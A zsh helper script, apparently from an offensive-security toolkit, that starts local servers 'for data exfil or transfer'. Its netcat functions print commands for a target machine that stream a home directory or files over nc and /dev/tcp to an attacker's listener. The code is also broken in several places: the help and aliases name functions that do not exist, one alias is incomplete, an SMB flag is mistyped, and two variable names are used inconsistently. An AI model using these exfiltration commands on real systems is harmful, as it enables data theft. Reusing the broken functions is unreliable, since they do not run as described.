#!/usr/bin/env zsh

############################################################# 
# qq-srv
#############################################################

qq-srv-help() {
  cat << END

qq-srv
-------
The srv namespace provides commands for hosting local services
such as web, ftp, smb and other services for data exfil or transfer.

Commands
--------
qq-srv-web: hosts a python3 web server
qq-srv-ftp: hosts a python3 ftp server
qq-srv-smb: hosts an impacket smb server 
qq-srv-tftp: starts the atftpd service
qq-srv-smtp: hosts a python3 smtp server
qq-srv-updog: hosts an updog web server

qq-srv-web-auto: hosts a python3 web server in /srv, port as $1
qq-srv-php-auto: hosts a php web server in /srv, port as $1
qq-srv-ftp-auto: hosts a python3 ftp server in /srv


END
}



qq-srv-web() print -z "sudo python3 -m http.server 80"
qq-srv-ftp() print -z "sudo python3 -m pyftpdlib -p 21 -w"
qq-srv-smb() print -z "sudo impacket-smbserver -smb2supp F ."
qq-srv-tftp() print -z "sudo service atftpd start"
qq-srv-smtp() print -z "sudo python3 -m smtpd -c DebuggingServer -n 0.0.0.0:25"

qq-srv-web-srv() {
    if [ "$#" -eq  "1" ]
    then
        pushd /srv; sudo python3 -m http.server $1; popd;
    else
        pushd /srv; sudo python3 -m http.server 80; popd;
    fi
}
alias srv-web="qq-srv-web-auto"

qq-srv-php-srv() {
    if [ "$#" -eq  "1" ]
    then
        pushd /srv; sudo php -S 0.0.0.0:$1; popd;
    else
        pushd /srv; sudo php -S 0.0.0.0:80; popd;
    fi
}
alias srv-php="qq-srv-php-auto"

qq-srv-ftp-srv() {
    pushd /srv
    sudo python3 -m pyftpdlib -p 21 -w
    popd
}
alias srv-ftp="qq-srv-ftp-auto"

qq-srv-updog() {
    print -z "updog -p 443 --ssl -p $(__rand 10)"
}

qq-srv-updog-srv() {
    updog -p 443 --ssl -d /srv
}
alias srv-up

qq-srv-nc-tar() {
    qq-vars-set-lhost
    local port && read "port?$fg[cyan]PORT:$reset_color "
    __info "tar cfv - /home/user | nc ${_LHOST} ${port}"
    print -z "nc -nvlp ${port} | tar xfv -"
}

qq-srv-nc-file() {
    qq-vars-set-lhost
    local port && read "port?$fg[cyan]PORT:$reset_color "
    __info "cat FILE > /dev/tcp/${__LHOST}/${port}"
    print -z "nc -nvlp ${port} -w 5 > incoming.txt"  
}

qq-srv-nc-b64() {
    qq-vars-set-lhost
    local port && read "port?$fg[cyan]PORT:$reset_color "
    __info "openssl base64 -in FILE > /dev/tcp/${__LHOST}/${port}"
    print -z "nc -nvlp ${port} -w 5 > incoming.b64 && openssl base64 -d -in incoming.b64 -out incoming.txt"  
}